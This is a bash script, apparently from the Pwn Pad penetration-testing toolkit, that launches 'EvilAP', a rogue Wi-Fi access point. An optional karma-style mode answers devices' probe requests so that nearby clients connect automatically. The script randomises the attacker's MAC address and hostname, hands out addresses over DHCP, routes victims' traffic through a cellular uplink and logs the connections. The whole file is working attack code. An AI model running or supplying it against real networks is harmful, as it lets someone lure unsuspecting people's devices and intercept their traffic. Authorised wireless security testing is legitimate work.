#!/bin/bash
# Desc: EvilAP script to forcefully connect wireless clients
clear

#this block controls the features for px_interface_selector
include_extwifi=0
include_monitor=0
include_airbase=0
include_cell=1
include_usb=0 #the computer thinks we are sharing internet, not the other way
#this interface selection is for the uplink, attack always uses wlan1
default_interface=gsm_int
message="be used for Internet uplink"
. /opt/pwnix/pwnpad-scripts/px_functions.sh

if include_monitor=1 f_validate_one wlan1mon; then
  interface=wlan1mon
elif include_extwifi=1 loud_one=1 f_validate_one wlan1; then
  interface=wlan1
fi

if [ -n "$interface" ]; then

trap f_endclean INT
trap f_endclean KILL

f_endclean(){
  printf "\n[-] Exiting...\n"
  f_restore_ident
  f_clean_up
  ifconfig wlan1 down &> /dev/null
}

f_clean_up(){
  printf "[-] Killing any instances of airbase or dhcpd\n"
  killall airbase-ng &> /dev/null
  killall dhcpd &> /dev/null
  hardw=`/system/bin/getprop ro.hardware`
  if [[ "$hardw" == "deb" || "$hardw" == "flo" ]]; then
    PHY=$(cat /sys/class/net/wlan1mon/phy80211/name)
    iw dev wlan1mon del
    iw phy $PHY interface add wlan1 type station
  else
    airmon-ng stop wlan1mon &> /dev/null
  fi
  iptables --flush
  iptables --table nat --flush
}

f_restore_ident(){
  printf "[+] Restoring network identity\n"
  hostn=`cat /etc/hostname`
  ifconfig wlan1 down &> /dev/null
  macchanger -p wlan1 &> /dev/null
  hostname $hostn
}

f_banner(){
  printf "\n[+] Welcome to EvilAP\n\n"
}

f_ssid(){
  clear
  printf "\n[+] Enter an SSID name\n"
  printf "[-] Default SSID: [Public_Wireless]\n\n"
  read -p "SSID: " ssid

  if [ -z $ssid ]; then
    ssid=Public_Wireless
  fi
}

f_channel(){
  clear
  printf "\n[+] Enter the channel to run EvilAP on [1-14]\n"
  printf "[-] Default channel: [1]\n\n"
  read -p "Channel: " channel

  case $channel in
    [1-14]*) ;;
    *) channel=1 ;;
  esac
}

f_beacon_rate(){
  clear
  printf "\n[+] Enter the beacon rate at which to broadcast probe requests:\n\n"
  printf "[!] If clients don't stay connected try changing this value\n\n"
  printf "[-] Default is: [30]\n\n"
  read -p "Range [20-70]: " brate

  if [ -z $brate ]; then
    brate=30
  fi
}

f_preplaunch(){
  #Change the hostname and mac address randomly
  printf "\n[+] Rolling MAC address and hostname randomly\n\n"

  ifconfig wlan1 down

  hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
  hostname $hn
  printf "[+] New hostname set: $hn\n"

  sleep 2
  #Put wlan1 into monitor mode and randomize mac - wlan1mon created
  airmon-ng start wlan1
  ifconfig wlan1mon down
  macchanger -r wlan1mon
  ifconfig wlan1mon up

  mkdir /dev/net/ &> /dev/null
  ln -s /dev/tun /dev/net/tun &> /dev/null
}

f_logname(){
  printf "/opt/pwnix/captures/wireless/evilap-$(date +%s).log\n"
}

f_evilap(){
  #Log path and name
  logname=$(f_logname)
  printf "[+] Creating new logfile: $logname\n"

  #Start Airbase-ng with -P for preferred networks
  airbase-ng -P -C $brate -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on at0
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

  #IP forwarding and iptables routing using internet connection
  printf 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE

  tail -f $logname
}

f_niceap(){
  #Log path and name
  logname=$(f_logname)
  printf "[+] Creating new logfile: $logname\n"

  #Start Airbase-ng with -P for preferred networks
  airbase-ng -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on at0
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

  #IP forwarding and iptables routing using internet connection
  printf 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE

  tail -f $logname
}

f_karmaornot(){
  clear
  printf "\n[?] Force clients to connect with their probe requests?\n\n"
  printf "[!] Everything will start connecting to you if YES is selected!\n\n"
  printf "1. Yes\n"
  printf "2. No\n\n"
  read -p "Choice [1-2]: " karma
  case $karma in
    [1-2]*) ;;
    *) f_karmaornot ;;
  esac

  if [ $karma -eq 1 ]; then
    f_beacon_rate
  fi

}

f_clean_up
f_banner
require_ip=1 f_interface
f_ssid
f_channel
f_karmaornot
f_preplaunch

if [ $karma -eq 1 ]; then
  printf "[+] Starting EvilAP with forced connection attack\n"
  f_evilap
else
  printf "[+] Starting EvilAP without forced connection attack\n"
  f_niceap
fi

f_endclean
fi
